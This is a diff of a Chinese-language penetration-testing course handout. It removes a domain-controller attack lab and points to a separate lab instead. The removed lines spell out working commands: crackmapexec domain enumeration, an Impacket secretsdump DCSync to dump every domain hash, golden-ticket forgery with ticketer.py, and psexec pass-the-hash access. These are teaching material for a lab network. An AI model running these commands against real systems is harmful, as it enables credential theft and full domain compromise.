@@ -1811,80 +1811,22 @@ python3 /opt/impacket/examples/psexec.py -hashes :'<NTLM_HASH>' administrator@19
 
 ---
 
-### 实验11：域控制器渗透（域环境扩展实验）
+### 扩展：域环境渗透（详见实验六）
 
-> ⚠️ **本实验需要域环境**：SRV02 需要配置为域控制器（corp.local），SRV01 加入域。如果实验环境未配置域，可跳过本实验。
+> 本任务的横向移动实验（实验9、实验10）聚焦于**工作组环境**下的凭据获取与 Pass-the-Hash。当目标网络为 **Active Directory 域环境**时，攻击者还可实施更高级的域级攻击——包括 Kerberoasting（离线破解服务账户密码）、DCSync（冒充域控复制导出全域哈希）、黄金票据伪造（持久化域管权限）以及 BloodHound 攻击路径分析。
 >
-> **域环境快速搭建**：
+> 这些内容已整合在独立实验 **《实验六：Windows域环境渗透与提权》** 中，包含从域信息收集→Kerberoasting→DCSync→BloodHound→加固验证的完整五阶段攻击链，预计用时 150 分钟。
+>
+> **本项目与实验六的衔接关系**：
 
-```powershell
-# 在 SRV02 上安装 AD DS 并提升为域控制器
-Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
-Install-ADDSForest -DomainName "corp.local" -DomainNetbiosName "CORP" -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -InstallDns -Force
+| 项目八（本讲义） | 实验六（独立实验） | 衔接点 |
+| --- | --- | --- |
+| frp/nps内网穿透 → 建立到内网的隧道 | 域信息收集 → 识别域控、枚举用户和SPN | 隧道建立后的第一步就是信息收集 |
+| 弱口令暴力破解 → 获取普通域用户凭据 | Kerberoasting → 从普通用户提权到服务账户 | 暴力破解获取的凭据可作为Kerberoasting的起点 |
+| Pass-the-Hash → 工作组横向移动 | DCSync → 域级横向移动导出全域哈希 | PtH获取的域管哈希可直接用于DCSync |
+| 安全加固（SMB签名、防火墙） | 域级加固（Protected Users、krbtgt重置、权限回收） | 项目八的网络层加固 + 实验六的身份层加固 = 完整防御体系 |
 
-# 重启后，在 SRV01 上加入域
-Add-Computer -DomainName "corp.local" -Credential (Get-Credential) -Restart
-```
-
-**第一步：域信息枚举**
-
-```bash
-# 在 Kali 上通过 frp 隧道枚举域信息
-
-# 使用 CrackMapExec 枚举域用户
-crackmapexec ldap 192.168.10.10 -p 10004 -d corp.local -u administrator -p 'P@ssw0rd' --users
-
-# 枚举域组
-crackmapexec ldap 192.168.10.10 -p 10004 -d corp.local -u administrator -p 'P@ssw0rd' --groups
-
-# 枚举域计算机
-crackmapexec ldap 192.168.10.10 -p 10004 -d corp.local -u administrator -p 'P@ssw0rd' --computers
-
-# 枚举域控制器
-crackmapexec ldap 192.168.10.10 -p 10004 -d corp.local -u administrator -p 'P@ssw0rd' --dc-list
-```
-
-**第二步：DCSync攻击导出域哈希**
-
-```bash
-# 使用 Impacket secretsdump 进行 DCSync 攻击
-# DCSync 模拟域控复制协议，远程导出所有域用户哈希
-python3 /opt/impacket/examples/secretsdump.py \
-  corp.local/administrator:'P@ssw0rd'@192.168.10.10 -just-dc-ntlm
-
-# 导出关键用户
-python3 /opt/impacket/examples/secretsdump.py \
-  corp.local/administrator:'P@ssw0rd'@192.168.10.10 -just-dc-user krbtgt
-
-# 预期输出：
-# corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM_HASH>:::
-# corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM_HASH>:::
-```
-
-**第三步：伪造黄金票据（Golden Ticket）**
-
-```bash
-# 获取域 SID
-python3 /opt/impacket/examples/lookupsid.py \
-  corp.local/administrator:'P@ssw0rd'@192.168.10.10
-
-# 使用 krbtgt 哈希伪造黄金票据
-# 将 <DOMAIN_SID> 和 <KRBTGT_HASH> 替换为实际值
-python3 /opt/impacket/examples/ticketer.py \
-  -domain-sid <DOMAIN_SID> \
-  -domain corp.local \
-  -nthash <KRBTGT_HASH> \
-  -user administrator
-
-# 使用黄金票据访问域控
-export KRB5CCNAME=/tmp/administrator.ccache
-python3 /opt/impacket/examples/psexec.py \
-  corp.local/administrator@dc01.corp.local -k -no-pass
-```
-
-> 💡 **黄金票据的危害**：拥有 krbtgt 的 NTLM 哈希后，攻击者可以伪造任意域用户的 Kerberos TGT 票据，有效期默认10年。这是域环境中最严重的持久化威胁之一。防御方法：定期（至少每180天）重置 krbtgt 密码两次。
-
----
+> 💡 **教学建议**：实验六适合在项目六（域管理）和项目八（内网安全）学完之后作为**综合实战**安排，将域管理和内网安全两部分知识融会贯通。学生在实验六中将体验从"普通域用户"到"全域控制"的完整攻击链，深刻理解"内网安全≠边界安全"。
 
 ## 📝 任务四知识点总结
 
@@ -1895,9 +1837,8 @@ python3 /opt/impacket/examples/psexec.py \
 | Pass-the-Hash | 无需明文密码，仅凭 NTLM 哈希即可完成身份认证和横向移动 |
 | Impacket 工具族 | psexec（SMB执行）、wmiexec（WMI执行）、secretsdump（哈希导出） |
 | Evil-WinRM | 基于WinRM的交互式Shell工具，支持文件上传和哈希获取 |
-| DCSync攻击 | 模拟域控复制协议，远程导出全部域用户哈希 |
-| 黄金票据 | 使用krbtgt哈希伪造TGT，实现域内持久化最高权限 |
 | frp在渗透中的角色 | 将内网服务映射到公网，使Impacket/Hydra等工具可直接攻击内网主机 |
+| 域级攻击（扩展） | Kerberoasting、DCSync、黄金票据等域级攻击详见《实验六：Windows域环境渗透与提权》 |
 
 ---
 
@@ -2190,8 +2131,9 @@ crackmapexec smb 192.168.10.10 -u administrator -H '<NTLM_HASH>' -p 10004
 | **项目一·走进Windows服务器** | 项目一中配置的网络环境（NAT模式、IP配置）是本项目的基础；本项目在双网卡场景下深化了网络配置的理解 |
 | **项目四·IIS网站管理** | 项目四部署的 IIS Web 服务可作为内网穿透的映射目标（实验4的Web隧道），IIS 安全加固在内网环境中同样重要 |
 | **项目五·远程管理** | 项目五配置的 RDP 和 WinRM 服务在本项目中成为横向移动的主要通道——RDP 暴力破解（实验9）、WinRM 远程执行（实验10）均依赖这些服务 |
-| **项目六·域管理** | 项目六搭建的域环境是本项目实验11（域控渗透）的前提；域用户凭据、krbtgt 哈希等概念直接来自域管理知识 |
+| **项目六·域管理** | 项目六搭建的域环境为域级渗透提供基础；域用户凭据、krbtgt 等概念直接来自域管理知识 |
 | **项目七·应用安全** | 项目七中讲解的后门持久化技术（注册表、计划任务、WMI）在内网渗透的"持久化"阶段使用；WebShell 可通过内网穿透隧道远程管理 |
+| **实验六·域环境渗透与提权** | 本项目实验9-10的 PtH 横向移动为实验六的域级攻击（Kerberoasting→DCSync→黄金票据）提供前置技能；实验六在本项目基础上将攻击从工作组扩展到域环境，两者合在一起构成"网络层穿透→身份层渗透"的完整攻击链 |
 
 ### MITRE ATT&CK 框架映射
 
@@ -2206,5 +2148,7 @@ crackmapexec smb 192.168.10.10 -u administrator -H '<NTLM_HASH>' -p 10004
 | Pass-the-Hash | 横向移动（Lateral Movement） | T1550.002 - Use Alternate Authentication Material: Pass the Hash |
 | PsExec/WMIExec | 横向移动（Lateral Movement） | T1021.002 - Remote Services: SMB/Windows Admin Shares |
 | Evil-WinRM | 横向移动（Lateral Movement） | T1021.006 - Remote Services: Windows Remote Management |
-| secretsdump/DCSync | 凭证访问（Credential Access） | T1003.006 - OS Credential Dumping: DCSync |
-| 黄金票据 | 持久化（Persistence） | T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket |
+| secretsdump/DCSync* | 凭证访问（Credential Access） | T1003.006 - OS Credential Dumping: DCSync |
+| 黄金票据* | 持久化（Persistence） | T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket |
+
+> *标注*的技术在《实验六：Windows域环境渗透与提权》中详细展开
